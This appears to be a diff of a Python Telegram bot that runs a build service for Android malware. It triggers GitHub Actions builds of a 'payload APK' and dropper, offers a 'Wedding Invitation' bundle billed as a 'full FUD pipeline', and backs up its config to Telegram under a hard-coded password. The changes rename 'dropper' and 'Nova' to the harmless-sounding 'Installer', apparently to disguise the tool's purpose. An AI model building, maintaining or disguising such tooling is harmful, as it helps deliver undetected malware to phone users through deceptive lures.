@@ -2965,7 +2965,7 @@ def prod_trigger_dev_build(chat_id: int, msg_id: int,
                            server_port_b64: str = "",
                            server_key_b64:  str = "") -> bool:
     """Trigger build_dev.yml on dev branch (test build — no client delivery).
-    build_type: 'full' = dropper+companion, 'companion_only' = payload APK only.
+    build_type: 'full' = installer+companion, 'companion_only' = payload APK only.
     server_host_b64/server_port_b64/server_key_b64: Base64-encoded server config.
     """
     url = (f"{GH_REPO()}/actions/workflows/build_dev.yml/dispatches")
@@ -5456,11 +5456,11 @@ def handle_callback(call):
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   "Choose what to build:\n\n"
                   "💍 <b>Wedding Invitation</b>\n"
-                  "   Dropper (Nova) + Payload (companion)\n"
+                  "   Installer + Companion APK\n"
                   "   Full bundle — full FUD pipeline\n\n"
                   "🔧 <b>Companion App</b>\n"
                   "   Payload only (companion.apk)\n"
-                  "   No dropper, no Nova — fast build\n\n"
+                  "   Companion only — fast build\n\n"
                   "⚠️ No client delivery — admin only.",
                   kb_prod_test_build_type())
 
@@ -5475,7 +5475,7 @@ def handle_callback(call):
         else:
             build_type  = "full"
             build_label = "💍 Wedding Invitation"
-            apk_note    = "Nova dropper + companion APK (full bundle)"
+            apk_note    = "Installer + Companion APK (full bundle)"
 
         # ── Wedding Invitation → show current values + choice screen ────────────
         if build_type == "full":
@@ -6661,7 +6661,7 @@ def _do_backup():
         import io as _io
         import zipfile as _zf
 
-        BACKUP_PASSWORD = "NovaFactory2026_BackupKey_AES256"
+        BACKUP_PASSWORD = "InstallerFactory2026_BackupKey_AES256"
         buf = _io.BytesIO()
         with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
             # Config values as JSON
@@ -6693,9 +6693,9 @@ def _do_backup():
         import requests as _req
         ts      = datetime.now(timezone.utc).strftime(
             "%Y-%m-%d_%H-%M")
-        caption = f"NOVA_BACKUP_{ts}"
+        caption = f"INSTALLER_BACKUP_{ts}"
         enc_buf = _io.BytesIO(enc)
-        enc_buf.name = f"nova_backup_{ts}.enc"
+        enc_buf.name = f"installer_backup_{ts}.enc"
         r = _req.post(
             f"https://api.telegram.org/bot"
             f"{config.BOT_TOKEN}/sendDocument",
